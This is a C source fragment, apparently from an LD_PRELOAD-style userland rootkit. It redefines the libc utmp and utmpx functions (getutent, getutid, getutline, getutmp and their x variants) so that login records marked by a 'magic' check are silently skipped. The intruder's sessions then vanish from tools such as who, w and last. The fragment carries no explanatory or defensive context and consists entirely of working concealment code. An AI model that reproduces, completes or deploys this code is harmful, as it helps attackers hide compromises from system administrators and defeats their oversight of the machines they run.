struct utmp *getutid(const struct utmp *ut){
    struct utmp *tmp;
    hook(CGETUTID);
    while((tmp = call(CGETUTID, ut)) != NULL && magicutmp(tmp));
    return tmp;
}
struct utmpx *getutxid(const struct utmpx *utx){
    struct utmpx *tmp;
    hook(CGETUTXID);
    while((tmp = call(CGETUTXID, utx)) != NULL && magicutmp(tmp));
    return tmp;
}
struct utmp *getutline(const struct utmp *ut){
    struct utmp *tmp;
    hook(CGETUTLINE);
    while((tmp = call(CGETUTLINE, ut)) != NULL && magicutmp(tmp));
    return tmp;
}
struct utmpx *getutxline(const struct utmpx *utx){
    struct utmpx *tmp;
    hook(CGETUTXLINE);
    while((tmp = call(CGETUTXLINE, utx)) != NULL && magicutmp(tmp));
    return tmp;
}
struct utmp *getutent(void){
    struct utmp *tmp;
    hook(CGETUTENT);
    while((tmp = call(CGETUTENT)) != NULL && magicutmp(tmp));
    return tmp;
}
struct utmpx *getutxent(void){
    struct utmpx *tmp;
    hook(CGETUTXENT);
    while((tmp = call(CGETUTXENT)) != NULL && magicutmp(tmp));
    return tmp;
}
void getutmp(const struct utmpx *ux, struct utmp *u){
    if(hide_me || (hide_me = magicutmp(ux) || magicutmp(u))) return;
    hook(CGETUTMP);
    call(CGETUTMP, ux, u);
}
void getutmpx(const struct utmp *u, struct utmpx *ux){
    if(hide_me || (hide_me = magicutmp(u) || magicutmp(ux))) return;
    hook(CGETUTMPX);
    call(CGETUTMPX, u, ux);
}